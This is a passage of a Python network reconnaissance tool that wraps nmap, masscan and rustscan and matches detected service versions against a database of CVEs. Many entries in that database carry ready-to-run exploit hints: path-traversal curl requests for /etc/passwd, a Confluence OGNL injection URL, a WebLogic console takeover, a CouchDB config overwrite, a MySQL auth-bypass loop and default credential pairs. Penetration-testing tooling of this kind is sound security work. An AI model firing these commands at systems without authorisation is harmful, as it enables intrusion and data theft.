    'grafana': ['http-title'],
    'gitlab': ['http-title'],
    'jenkins': ['http-title'],
    'confluence': ['http-title'],
    'kibana': ['http-title'],
    'sonarqube': ['http-title'],
    'nexus': ['http-title'],
    'artifactory': ['http-title'],
    'phpmyadmin': ['http-title'],
    'adminer': [],
    'cockpit': [],
    'portainer': [],
    'rancher': [],
    # ── SMB / CIFS ──
    'samba': [
        'smb-vuln-ms17-010', 'smb-vuln-cve-2017-7494',
        'smb-double-pulsar-backdoor', 'smb-enum-shares', 'smb-enum-users',
    ],
    'windows': ['smb-vuln-ms17-010'],
    # ── IRC ──
    'unrealircd': ['irc-unrealircd-backdoor'],
    'inspircd': [],
    'charybdis': [],
    # ── Mail Servers ──
    'exim': ['smtp-commands', 'smtp-vuln-cve2010-4344'],
    'postfix': ['smtp-commands'],
    'sendmail': ['smtp-commands'],
    'dovecot': [],
    'courier': [],
    'cyrus': [],
    'hmail': [],
    'exchange': [],
    'zimbra': [],
    # ── Databases ──
    'mariadb': ['mysql-info', 'mysql-databases', 'mysql-empty-password'],
    'percona': ['mysql-info', 'mysql-databases', 'mysql-empty-password'],
    'couchdb': ['couchdb-databases', 'couchdb-stats'],
    'rethinkdb': [],
    'arangodb': [],
    # ── Proxy / Load Balancer ──
    'squid': ['http-open-proxy'],
    'haproxy': [],
    'varnish': [],
    'traefik': [],
    'envoy': [],
    # ── Monitoring ──
    'nagios': ['http-default-accounts'],
    'zabbix': [],
    'prometheus': [],
    'icinga': [],
    # ── Network Equipment ──
    'mikrotik': [],
    'routeros': [],
    'cisco': [],
    'junos': [],
    'fortios': [],
    'pfsense': [],
    'opnsense': [],
    'ubiquiti': [],
    # ── Message Brokers ──
    'rabbitmq': ['amqp-info'],
    'activemq': [],
    'mosquitto': ['mqtt-subscribe'],
    # ── Container / Orchestration ──
    'docker': ['docker-version'],
    'containerd': [],
    'podman': [],
    # ── Remote Access ──
    'distcc': ['distcc-cve2004-2687'],
    'pcanywhere': ['pcanywhere-brute'],
    # ── Printing ──
    'cups': ['cups-info', 'cups-queue-info'],
    # ── Industrial ──
    'siemens': ['s7-info'],
    'schneider': [],
    'rockwell': [],
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KNOWN VULNERABLE VERSIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VULN_DB = [
    # (product_regex, version_regex, description, cve, exploit_hint)
    (r'proftpd', r'1\.3\.5', 'ProFTPD 1.3.5 mod_copy RCE', 'CVE-2015-3306',
     'Metasploit: exploit/unix/ftp/proftpd_modcopy_exec'),
    (r'proftpd', r'1\.3\.3', 'ProFTPD 1.3.3c telnet IAC buffer overflow', 'CVE-2011-4130',
     'Metasploit: exploit/unix/ftp/proftpd_133c_backdoor'),
    (r'vsftpd', r'2\.3\.4', 'vsftpd 2.3.4 Backdoor Command Execution', 'CVE-2011-2523',
     'Metasploit: exploit/unix/ftp/vsftpd_234_backdoor'),
    (r'apache', r'2\.4\.49', 'Apache 2.4.49 Path Traversal + RCE', 'CVE-2021-41773',
     'curl: curl --path-as-is "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"'),
    (r'apache', r'2\.4\.50', 'Apache 2.4.50 Path Traversal + RCE', 'CVE-2021-42013',
     'curl: curl --path-as-is "http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"'),
    (r'openssh', r'7\.2p1', 'OpenSSH 7.2p1 Username Enumeration', 'CVE-2016-6210',
     'Metasploit: auxiliary/scanner/ssh/ssh_enumusers'),
    (r'openssh', r'[5-6]\.\d', 'OpenSSH <7.0 - Possible username enum', 'CVE-2016-6210',
     'Metasploit: auxiliary/scanner/ssh/ssh_enumusers'),
    (r'samba', r'^3\.0\.2[0-5]', 'Samba 3.0.20 usermap_script RCE (root)', 'CVE-2007-2447',
     'Metasploit: exploit/multi/samba/usermap_script'),
    (r'samba', r'^(?:3\.[56]\.|4\.[0-5]\.|4\.6\.[0-4])', 'Samba SambaCry RCE', 'CVE-2017-7494',
     'Metasploit: exploit/linux/samba/is_known_pipename'),
    (r'samba', r'^3\.[0-5]\.', 'Samba Symlink Traversal', 'CVE-2010-0926',
     'Metasploit: auxiliary/admin/smb/samba_symlink_traversal'),
    (r'webmin', r'1\.(8[0-9]|9[01])', 'Webmin <1.920 RCE', 'CVE-2019-15107',
     'Metasploit: exploit/unix/webapp/webmin_backdoor'),
    (r'unrealircd', r'3\.2\.8\.1', 'UnrealIRCd 3.2.8.1 Backdoor', 'CVE-2010-2075',
     'Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor'),
    (r'drupal', r'[78]\.(([0-4]\d?)|5[0-7])', 'Drupal Drupalgeddon2 RCE', 'CVE-2018-7600',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'tomcat', r'[4-8]\.', 'Apache Tomcat - Check for default credentials', '',
     'Try: admin:admin, tomcat:tomcat, admin:password, manager:manager'),
    (r'jenkins', r'', 'Jenkins - Check for unauthenticated Script Console', '',
     'Browse: http://TARGET:PORT/script'),
    (r'exim', r'4\.8[6-9]', 'Exim 4.87-4.91 RCE', 'CVE-2019-10149',
     'Metasploit: exploit/unix/smtp/exim4_string_format'),
    (r'microsoft-iis', r'[56]\.', 'IIS 5.x/6.x - Multiple vulns', '',
     'Check: WebDAV, PUT method, short filename brute'),
    (r'mysql', r'5\.[0-5]\.', 'MySQL 5.x - Check empty root password', 'CVE-2012-2122',
     'Try: mysql -h TARGET -u root'),
    (r'redis', r'', 'Redis - Check for no auth', '',
     'Try: redis-cli -h TARGET INFO'),
    (r'mongodb', r'', 'MongoDB - Check for no auth', '',
     'Try: mongo --host TARGET --eval "db.adminCommand({listDatabases:1})"'),
    (r'elasticsearch', r'[1-6]\.', 'Elasticsearch - Check for no auth + RCE', 'CVE-2015-1427',
     'curl http://TARGET:9200/_cat/indices'),
    # ── SSH (additional) ──
    (r'openssh', r'7\.7', 'OpenSSH 7.7 Username Enumeration', 'CVE-2018-15473',
     'Metasploit: auxiliary/scanner/ssh/ssh_enumusers'),
    (r'openssh', r'8\.5p1', 'OpenSSH 8.5p1 Double-Free', 'CVE-2023-25136',
     'Pre-auth memory corruption; limited direct impact'),
    (r'openssh', r'[89]\.\d.*p1', 'OpenSSH RegreSSHion', 'CVE-2024-6387',
     'Check if glibc-based Linux: race condition in SIGALRM handler'),
    (r'libssh', r'0\.[6-8]\.', 'libssh Authentication Bypass', 'CVE-2018-10933',
     'Metasploit: auxiliary/scanner/ssh/libssh_auth_bypass'),
    (r'dropbear', r'201[0-5]\.', 'Dropbear SSH < 2016.72 multiple vulns', 'CVE-2016-7406',
     'searchsploit dropbear'),
    # ── HTTP / Web Servers (additional) ──
    (r'apache', r'2\.4\.(4[89]|50)', 'Apache 2.4.48-50 Path Traversal + RCE', 'CVE-2021-41773',
     'curl --path-as-is "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"'),
    (r'nginx', r'1\.(4\.[0-6]|[0-3]\.)', 'Nginx < 1.4.7 - Check alias traversal', '',
     'Test: curl http://TARGET/static../etc/passwd (alias misconfiguration)'),
    (r'microsoft-iis', r'6\.0', 'IIS 6.0 WebDAV Buffer Overflow RCE', 'CVE-2017-7269',
     'Metasploit: exploit/windows/iis/iis_webdav_scstoragepathfromurl'),
    (r'microsoft-iis', r'10\.0', 'IIS 10.0 HTTP.sys RCE', 'CVE-2021-31166',
     'Metasploit: auxiliary/dos/http/http_sys_accept'),
    (r'apache tomcat', r'[789]\.', 'Tomcat Ghostcat AJP File Read', 'CVE-2020-1938',
     'Metasploit: auxiliary/admin/http/tomcat_ghostcat'),
    (r'jboss', r'[4-6]\.', 'JBoss 4-6 Java Deserialization RCE', 'CVE-2015-7501',
     'Metasploit: exploit/multi/http/jboss_invoke_deploy'),
    (r'weblogic', r'1[024]\.', 'WebLogic T3/IIOP Deserialization RCE', 'CVE-2019-2725',
     'Metasploit: exploit/multi/misc/weblogic_deserialize'),
    (r'weblogic', r'12\.|14\.', 'WebLogic Admin Console Takeover', 'CVE-2020-14882',
     'curl "http://TARGET:7001/console/css/%252e%252e%252fconsole.portal"'),
    (r'glassfish', r'[34]\.', 'GlassFish Admin Traversal + Default Creds', 'CVE-2017-1000028',
     'Default admin with empty password on port 4848'),
    (r'lighttpd', r'1\.4\.(1\d|2[0-8])', 'Lighttpd < 1.4.29 multiple vulns', '',
     'searchsploit lighttpd'),
    (r'grafana', r'[2-8]\.', 'Grafana < 8.3.0 Arbitrary File Read', 'CVE-2021-43798',
     'curl --path-as-is "http://TARGET:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2fetc/passwd"'),
    (r'kibana', r'[5-6]\.', 'Kibana < 6.6.0 Prototype Pollution RCE', 'CVE-2019-7609',
     'Metasploit: exploit/multi/http/kibana_timelion_prototype_pollution'),
    (r'gitlab', r'(8|9|1[01])\.\d', 'GitLab < 11.4.7 SSRF to RCE', 'CVE-2018-19571',
     'Metasploit: exploit/multi/http/gitlab_file_read_rce'),
    (r'gitlab', r'1[3-5]\.', 'GitLab ExifTool RCE', 'CVE-2021-22205',
     'Metasploit: exploit/multi/http/gitlab_exif_rce'),
    (r'confluence', r'[567]\.', 'Confluence OGNL Injection RCE', 'CVE-2022-26134',
     'curl "http://TARGET/%24%7Bnew+javax.script.ScriptEngineManager().getEngineByName(...)%7D/"'),
    (r'spring', r'[45]\.', 'Spring4Shell RCE (Spring Framework)', 'CVE-2022-22965',
     'Metasploit: exploit/multi/http/spring_framework_rce_spring4shell'),
    (r'phpmyadmin', r'4\.[0-8]\.', 'phpMyAdmin < 4.8.2 LFI to RCE', 'CVE-2018-12613',
     'curl "http://TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../etc/passwd"'),
    (r'jetty', r'9\.[0-3]\.', 'Jetty < 9.4 multiple vulns', '',
     'searchsploit jetty'),
    (r'wildfly', r'[89]\.', 'WildFly/JBoss - Check management console default creds', '',
     'Try: admin:admin on port 9990'),
    # ── CMS ──
    (r'drupal', r'7\.([0-4]\d?|5[0-7])', 'Drupal 7 Drupalgeddon2 RCE', 'CVE-2018-7600',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'drupal', r'8\.[0-5]\.', 'Drupal 8 Drupalgeddon2 RCE', 'CVE-2018-7600',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'drupal', r'[78]\.', 'Drupal Drupalgeddon3 RCE', 'CVE-2018-7602',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'joomla', r'[12]\.[05]', 'Joomla < 3.7 SQL Injection', 'CVE-2017-8917',
     'sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"'),
    # ── SMB / Windows (additional) ──
    (r'microsoft-ds', r'6\.1', 'Windows 7/2008R2 - MS17-010 EternalBlue', 'CVE-2017-0144',
     'Metasploit: exploit/windows/smb/ms17_010_eternalblue'),
    (r'microsoft-ds', r'6\.3', 'Windows 2012R2 - MS17-010 EternalBlue', 'CVE-2017-0144',
     'Metasploit: exploit/windows/smb/ms17_010_eternalblue'),
    (r'microsoft-ds', r'10\.0', 'Windows 10/2016/2019 - Check SMBGhost', 'CVE-2020-0796',
     'Metasploit: exploit/windows/smb/cve_2020_0796_smbghost'),
    # ── Databases (additional) ──
    (r'couchdb', r'[12]\.', 'CouchDB < 2.1.0 RCE via Config Overwrite', 'CVE-2017-12636',
     'curl -X PUT "http://TARGET:5984/_config/query_servers/cmd" -d \'"id"\' '),
    (r'postgresql', r'[89]\.|1[0-5]\.', 'PostgreSQL - Check trust auth + UDF injection', '',
     'psql -h TARGET -U postgres; Check: COPY command, large objects'),
    (r'mariadb', r'5\.[0-5]\.|10\.[0-2]\.', 'MariaDB/MySQL Auth Bypass', 'CVE-2012-2122',
     'for i in $(seq 1 1000); do mysql -u root -h TARGET --password=bad 2>/dev/null; done'),
    (r'riak', r'', 'Riak - No auth HTTP API by default', '',
     'curl http://TARGET:8098/buckets?buckets=true'),
    (r'influxdb', r'[01]\.', 'InfluxDB - Check for no auth', '',
     'curl "http://TARGET:8086/query?q=SHOW+DATABASES"'),
    # ── Industrial / SCADA ──
    (r'modbus', r'', 'Modbus - No authentication by design', '',
     'nmap --script modbus-discover -p 502 TARGET'),
    (r'bacnet', r'', 'BACnet - No authentication by design', '',
     'nmap --script bacnet-info -p 47808 TARGET'),
    (r's7comm', r'', 'S7comm Siemens PLC - No authentication by design', '',
     'nmap --script s7-info -p 102 TARGET'),
    (r'fox', r'', 'Niagara Fox - Default credentials common', '',
     'nmap --script fox-info -p 1911 TARGET'),
    (r'enip', r'', 'EtherNet/IP - No authentication by design', '',
     'nmap --script enip-info -p 44818 TARGET'),
    (r'dnp3', r'', 'DNP3 - No authentication by design', '',
     'nmap -p 20000 --script dnp3-info TARGET (if script available)'),
    # ── Miscellaneous ──
    (r'ipmi', r'2\.0', 'IPMI 2.0 RAKP Authentication Hash Disclosure', 'CVE-2013-4786',
     'Metasploit: auxiliary/scanner/ipmi/ipmi_dumphashes'),
    (r'ipmi', r'', 'IPMI Cipher Zero Authentication Bypass', 'CVE-2013-4786',
     'ipmitool -I lanplus -C 0 -H TARGET -U root -P root user list'),
    (r'docker', r'', 'Docker API - Unauthenticated access check', '',
     'curl http://TARGET:2375/version && curl http://TARGET:2375/containers/json'),
    (r'nrpe', r'[12]\.', 'Nagios NRPE < 3.0 Command Injection', 'CVE-2014-2913',
     'Metasploit: exploit/linux/misc/nagios_nrpe_arguments'),
    (r'distcc', r'', 'DistCC Daemon Command Execution', 'CVE-2004-2687',
     'Metasploit: exploit/unix/misc/distcc_exec'),
    (r'java.rmi|rmiregistry', r'', 'Java RMI Registry Classloader RCE', 'CVE-2011-3556',
     'Metasploit: exploit/multi/misc/java_rmi_server'),
    (r'jdwp', r'', 'JDWP Remote Code Execution (no auth)', '',
     'Tool: jdwp-shellifier.py -t TARGET -p PORT --cmd "id"'),
    (r'ntp', r'', 'NTP monlist Amplification + Info Leak', 'CVE-2013-5211',
     'ntpdc -n -c monlist TARGET'),
    (r'snmp', r'', 'SNMP Default Community Strings', '',
     'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET'),
    (r'tftp', r'', 'TFTP - No authentication by design', '',
     'nmap --script tftp-enum -p 69 TARGET'),
    (r'rsync', r'', 'Rsync - Unauthenticated module access check', '',
     'rsync rsync://TARGET/ && rsync -av rsync://TARGET/MODULE /tmp/rsync_loot'),
    (r'x11', r'', 'X11 - Unauthenticated display access', '',
     'xdpyinfo -display TARGET:0; xwd -root -display TARGET:0 -out /tmp/screen.xwd'),
    (r'vnc', r'', 'VNC - No auth / weak auth check', '',
     'Metasploit: auxiliary/scanner/vnc/vnc_none_auth'),
    (r'finger', r'', 'Finger - User enumeration', '',
     'finger @TARGET && finger root@TARGET && finger admin@TARGET'),
    (r'pcanywhere', r'', 'pcAnywhere - Credential file disclosure', 'CVE-2006-0630',
     'Metasploit: auxiliary/scanner/pcanywhere/pcanywhere_login'),
    (r'afp', r'', 'AFP - Unauthenticated share access check', '',
     'nmap --script afp-showmount -p 548 TARGET'),
    (r'hadoop', r'', 'Hadoop - Unauthenticated WebUI/REST API', '',
     'curl http://TARGET:50070/dfshealth.html; curl http://TARGET:8088/cluster/apps'),
    (r'cups', r'1\.[0-6]\.', 'CUPS < 1.6 multiple vulnerabilities', '',
     'searchsploit cups'),
    (r'netbus', r'', 'NetBus Remote Administration Backdoor', '',
     'Metasploit: exploit/windows/misc/netbus'),
    (r'activemq', r'5\.', 'Apache ActiveMQ < 5.18.3 RCE', 'CVE-2023-46604',
     'Metasploit: exploit/multi/misc/apache_activemq_rce_cve_2023_46604'),
    (r'exchange', r'201[369]|2022', 'Exchange ProxyShell / ProxyLogon', 'CVE-2021-34473',
     'Metasploit: exploit/windows/http/exchange_proxyshell_rce'),
    (r'exim', r'4\.(8[7-9]|9[01])', 'Exim 4.87-4.91 RCE (The Return of the WIZard)', 'CVE-2019-10149',
     'Metasploit: exploit/unix/smtp/exim4_string_format'),
    (r'postfix', r'', 'Postfix - Check for open relay', '',
     'nmap --script smtp-open-relay -p 25 TARGET'),
    (r'sendmail', r'8\.(1[0-3])', 'Sendmail < 8.14 multiple vulns', '',
     'searchsploit sendmail'),
    (r'dovecot', r'[12]\.0', 'Dovecot < 2.1 multiple vulns', '',
     'searchsploit dovecot'),
    (r'squid', r'[2-4]\.', 'Squid Proxy - Open proxy / cache poisoning check', '',
     'curl -x http://TARGET:3128 http://ifconfig.me'),
    (r'zabbix', r'[2-5]\.', 'Zabbix < 5.4 SQL Injection / RCE', 'CVE-2021-27927',
     'searchsploit zabbix'),
    (r'mikrotik|routeros', r'6\.[0-3]', 'MikroTik RouterOS Winbox RCE', 'CVE-2018-14847',
     'Metasploit: exploit/linux/misc/mikrotik_winbox_fileread'),
    (r'zimbra', r'[89]\.[0-1]', 'Zimbra RCE via LFI', 'CVE-2019-9670',
     'searchsploit zimbra'),
    (r'sonarqube', r'[7-8]\.', 'SonarQube - Default creds admin:admin', '',
     'Try: http://TARGET:9000 with admin:admin'),
    (r'nexus', r'[23]\.', 'Nexus Repository Manager RCE', 'CVE-2020-36518',
     'searchsploit nexus'),
    (r'openssl', r'1\.0\.1[a-f]', 'OpenSSL Heartbleed', 'CVE-2014-0160',
     'Metasploit: auxiliary/scanner/ssl/openssl_heartbleed'),
    (r'openssl', r'1\.0\.[01]', 'OpenSSL CCS Injection', 'CVE-2014-0224',
     'nmap --script ssl-ccs-injection -p PORT TARGET'),
    (r'openssl', r'0\.9\.[0-8]', 'OpenSSL < 1.0 - Multiple critical vulns', '',
     'Upgrade immediately; check: ssl-poodle, ssl-heartbleed, ssl-dh-params'),
    (r'varnish', r'[1-4]\.', 'Varnish Cache - Check for unprotected admin', '',
     'curl http://TARGET:6082/'),
    (r'cockroachdb', r'', 'CockroachDB - Check for no auth', '',
     'Try: cockroach sql --insecure --host=TARGET'),
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NSE SCRIPT MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def find_nse_dir():
    """Find the nmap NSE scripts directory."""
    candidates = [
        Path('/usr/share/nmap/scripts'),
        Path('/snap/nmap/current/usr/share/nmap/scripts'),
        Path('/usr/local/share/nmap/scripts'),
        Path('/opt/homebrew/share/nmap/scripts'),
    ]
    for p in candidates:
        if p.exists():
            return p
    # Try to find via nmap
    try:
        r = subprocess.run(['nmap', '--script-help=default'], capture_output=True, text=True, timeout=5)
        return candidates[0]  # fallback
    except Exception:
        return candidates[0]

NSE_DIR = find_nse_dir()

def nse_exists(name):
    """Check if an NSE script exists."""
    return (NSE_DIR / f"{name}.nse").exists()

def filter_existing_scripts(scripts):
    """Return only scripts that exist on the system."""
    return [s for s in scripts if nse_exists(s)]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TOOL DETECTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TOOL_LIST = [
    'nikto', 'gobuster', 'ffuf', 'dirb', 'enum4linux', 'enum4linux-ng',
    'smbclient', 'smbmap', 'rpcclient', 'snmpwalk', 'snmpcheck', 'onesixtyone',
    'showmount', 'rpcinfo', 'ldapsearch', 'hydra', 'medusa',
    'whatweb', 'wpscan', 'sqlmap', 'searchsploit', 'nuclei',
    'rustscan', 'masscan', 'curl', 'wget', 'ftp', 'nc',
    'sslscan', 'testssl.sh', 'testssl', 'openssl', 'netexec', 'crackmapexec',
    'git', 'nbtscan', 'dig', 'whois', 'redis-cli', 'mongo', 'mysql', 'psql',
    'ike-scan', 'responder', 'impacket-getarch', 'evil-winrm',
]

def check_tools():
    return {t: shutil.which(t) for t in TOOL_LIST}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NMAP RUNNER & XML PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VERBOSE_STREAM = os.environ.get('SMARTNMAP_STREAM', '1') != '0'


def _stream_process(cmd, txt_file, timeout, quiet=False, prefix='    '):
    """Run a subprocess streaming stdout/stderr live to the terminal and to file.
    Returns (returncode, combined_output)."""
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, universal_newlines=True,
        )
    except FileNotFoundError:
        error(f"{cmd[0]} not found on PATH")
        return 127, ''
    start = time.time()
    output_lines = []

    def reader():
        try:
            for line in proc.stdout:
                output_lines.append(line)
                if not quiet:
                    sys.stdout.write(f"{C.Di}{prefix}{line}{C.Re}")
                    sys.stdout.flush()
        except Exception:
            pass

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    rc = None
    try:
        while True:
            if proc.poll() is not None:
                rc = proc.returncode
                break
            if time.time() - start > timeout:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                rc = 124
                warn(f"{cmd[0]} timed out after {timeout}s")
                break
            time.sleep(0.2)
    except KeyboardInterrupt:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        rc = 130
        warn("Scan interrupted by user")
    t.join(timeout=2)
    out = ''.join(output_lines)
    try:
        Path(txt_file).write_text(out)
    except Exception:
        pass
    return rc if rc is not None else 0, out


def run_nmap(args, xml_file, label='', timeout=600, stream=None):
    """Run nmap, save XML + text output. Streams output live by default.
    Returns (returncode, stdout)."""
    cmd = ['nmap', '-oX', str(xml_file)] + args
    info(f"Running: {C.Di}{' '.join(cmd)}{C.Re}")
    stream_live = VERBOSE_STREAM if stream is None else stream
    txt_file = xml_file.with_suffix('.txt')
    try:
        if stream_live:
            rc, out = _stream_process(cmd, txt_file, timeout, quiet=False)
            return rc, out
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        txt_file.write_text(result.stdout + result.stderr)
        if result.returncode != 0 and result.stderr:
            for line in result.stderr.strip().split('\n'):
                if 'warning' not in line.lower() and line.strip():
                    warn(f"nmap: {line.strip()}")
        return result.returncode, result.stdout
    except subprocess.TimeoutExpired:
        error(f"Nmap timed out ({timeout}s) for: {label}")
        return 1, ""
    except FileNotFoundError:
        error("nmap not found! Install with: apt install nmap")
        sys.exit(1)


def run_masscan(target, outdir, rate=10000, ports='1-65535', timeout=300):
    """Use masscan for ultra-fast port discovery. Returns sorted list of open TCP ports."""
    if not shutil.which('masscan'):
        return None
    out_file = outdir / 'masscan.json'
    cmd = ['masscan', target, '-p', ports, '--rate', str(rate),
           '-oJ', str(out_file), '--wait', '1']
    info(f"masscan {target} -p{ports} rate={rate}")
    rc, out = _stream_process(cmd, outdir / 'masscan.txt', timeout,
                              quiet=True, prefix='  [masscan] ')
    ports_found = set()
    if out_file.exists():
        try:
            raw = out_file.read_text().strip()
            if raw and raw != '[]':
                # masscan JSON is an array
                try:
                    data = json.loads(raw.rstrip(','))
                except json.JSONDecodeError:
                    data = json.loads('[' + raw.rstrip(',') + ']')
                for e in (data or []):
                    for port_entry in e.get('ports', []):
                        p = port_entry.get('port')
                        if p:
                            ports_found.add(int(p))
        except Exception as e:
            warn(f"masscan parse issue: {e}")
    return sorted(ports_found)


def run_rustscan(target, outdir, ports='1-65535', timeout=120, ulimit=5000):
    """Use rustscan for fast TCP port discovery. Returns list of open ports."""
    if not shutil.which('rustscan'):
        return None
    out_file = outdir / 'rustscan.txt'
    cmd = ['rustscan', '-a', target, '-b', '2500', '-t', '2000',
           '-u', str(ulimit), '--range', ports, '--greppable', '--no-config']
    info(f"rustscan {target} {ports}")
    rc, out = _stream_process(cmd, out_file, timeout,
                              quiet=True, prefix='  [rustscan] ')
    ports_found = set()
    for line in out.splitlines():
        line = line.strip()
        if not line or ':' not in line or line.startswith('['):
            continue
        # format: <ip> -> [port,port,port]
        if '->' in line and '[' in line:
            m = re.search(r'\[([0-9,]+)\]', line)
            if m:
                for p in m.group(1).split(','):
                    if p.strip().isdigit():
                        ports_found.add(int(p.strip()))
    return sorted(ports_found)


def tcp_connect_probe(target, ports, timeout=1.5, workers=200):
    """Python-native fast TCP connect scan as ultimate fallback. Returns open ports."""
    open_ports = []

    def probe(p):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                res = s.connect_ex((target, p))
                if res == 0:
                    return p
        except Exception:
            return None
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        for res in ex.map(probe, ports):
            if res:
                open_ports.append(res)
    return sorted(open_ports)


def resolve_target(target):
    """Resolve hostname->IP. Returns tuple (ip, hostname) or (target, None)."""
    try:
        ipaddress.ip_address(target)
        return target, None
    except ValueError:
        pass
    try:
        ip = socket.gethostbyname(target)
        return ip, target
    except Exception:
        return target, None


def is_valid_target(target):
    """Validate target: IP, CIDR, or hostname."""
    if not target:
        return False
    try:
        ipaddress.ip_network(target, strict=False)
        return True
    except ValueError:
        return bool(re.match(r'^(?:[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)*[A-Za-z]{2,}$', target))


def check_host_alive(target, ports=(80, 443, 22, 445, 3389, 8080), timeout=1.5):
    """Quick TCP-probe test if host is alive on common ports (for -Pn scan decision)."""
    for p in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                if s.connect_ex((target, p)) == 0:
                    return True
        except Exception:
            pass
    return False

def parse_xml(xml_file):
    """Parse nmap XML, return structured dict."""
    if not xml_file.exists():
        return {'hosts': [], 'ports': [], 'services': {}, 'os': [], 'scripts': {}, 'alive_hosts': []}
    result = {'hosts': [], 'ports': [], 'services': {}, 'os': [], 'scripts': {}, 'alive_hosts': []}
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        for host in root.findall('host'):
            addr_el = host.find('address')
            addr = addr_el.get('addr', '') if addr_el is not None else ''
            status_el = host.find('status')
            if status_el is not None and status_el.get('state') == 'up':
                if addr and addr not in result['alive_hosts']:
                    result['alive_hosts'].append(addr)
                if addr and addr not in result['hosts']:
                    result['hosts'].append(addr)
            ports_el = host.find('ports')
            if ports_el is not None:
                for p in ports_el.findall('port'):
                    state = p.find('state')
                    if state is None or state.get('state') != 'open':
                        continue
                    port_num = int(p.get('portid', 0))
                    svc_el = p.find('service')
                    svc = {
                        'port': port_num, 'proto': p.get('protocol', 'tcp'),
                        'service': svc_el.get('name', '') if svc_el is not None else '',
                        'product': svc_el.get('product', '') if svc_el is not None else '',
                        'version': svc_el.get('version', '') if svc_el is not None else '',
                        'extra': svc_el.get('extrainfo', '') if svc_el is not None else '',
                        'tunnel': svc_el.get('tunnel', '') if svc_el is not None else '',
                        'scripts': {},
                    }
                    for sc in p.findall('script'):
                        svc['scripts'][sc.get('id', '')] = sc.get('output', '')
                    result['ports'].append(port_num)
                    result['services'][port_num] = svc
            os_el = host.find('os')
            if os_el is not None:
                for m in os_el.findall('osmatch'):
                    result['os'].append({'name': m.get('name', ''), 'accuracy': m.get('accuracy', '')})
            hs = host.find('hostscript')
            if hs is not None:
                for sc in hs.findall('script'):
                    result['scripts'][sc.get('id', '')] = sc.get('output', '')
    except ET.ParseError as e:
        warn(f"XML parse error: {e}")
    return result

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# VERSION VULNERABILITY CHECK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_vulns(services):
    """Cross-reference services against known vulns. Returns list of findings."""
    findings = []
    for port, svc in services.items():
        product = svc.get('product', '').lower()
        version = svc.get('version', '').lower()
        service = svc.get('service', '').lower()
        full = f"{product} {version}".strip()
        for prod_re, ver_re, desc, cve, exploit in VULN_DB:
            if re.search(prod_re, product, re.I) or re.search(prod_re, service, re.I):
                if not ver_re or re.search(ver_re, version, re.I):
                    findings.append({
                        'port': port, 'service': svc.get('service'),
                        'product': svc.get('product'), 'version': svc.get('version'),
                        'desc': desc, 'cve': cve, 'exploit': exploit,
                    })
    return findings

def check_config_vulns(services, host_scripts):
    """Check for dangerous configuration issues from host script outputs."""
    findings = []
    all_script_text = ' '.join(host_scripts.values())
    # Also check per-port scripts
    for port, svc in services.items():
        for sid, sout in svc.get('scripts', {}).items():
            all_script_text += ' ' + sout

    if re.search(r'NT LM 0\.12', all_script_text) or re.search(r'(?i)SMBv1', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': 'v1',
            'desc': 'SMBv1 enabled (dangerous, enables EternalBlue/WannaCry)', 'cve': 'MS17-010',
            'exploit': 'Metasploit: exploit/windows/smb/ms17_010_eternalblue',
        })
    if re.search(r'(?i)message.signing.*disabled', all_script_text):
        findings.append({
